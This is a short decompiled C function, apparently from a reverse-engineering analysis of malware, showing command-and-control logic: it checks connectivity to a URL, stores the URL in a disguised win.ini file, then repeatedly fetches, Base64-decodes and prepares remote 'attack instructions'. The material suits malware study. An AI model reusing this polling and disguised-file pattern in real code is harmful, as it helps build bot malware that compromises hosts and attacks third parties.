void Win_ini_Configuration(void) {
  byte bVar1;
  int iVar2;
  undefined8 uVar3;
  size_t sVar4;
  size_t local_38;
  undefined local_29;
  char *local_28;
  int local_20;
  char local_19;
  FILE *local_18;
  char local_9;
  
  iVar2 = InternetCheckConnectionA(&URL,1,0);
  local_9 = iVar2 != 0;
  if ((bool)local_9) {
    local_18 = fopen("C://Users//Public//Documents//win.ini","w");
    fprintf(local_18,(char *)&URL);
    fclose(local_18);
  }
  while( true ) {
    if (local_9 == '\0')
      return;
    uVar3 = Verify_Connection();
    local_19 = (char)uVar3;
    if (local_19 != '\x01')
      return;
    FUN_00402509();
    sVar4 = strlen(&Attack_Instructions);
    local_20 = (int)sVar4;
    if (local_20 == 0)
      return;
    local_38 = strlen(&Attack_Instructions);
    local_28 = (char *)Base64_Decoding(0x4099c0,local_38,&local_38);
    if (local_28 == (char *)0x0) break;
    bVar1 = Attack_Prep(local_28);
    if (bVar1 != 0)
      return;
    local_29 = 0;
  }
  return;
}
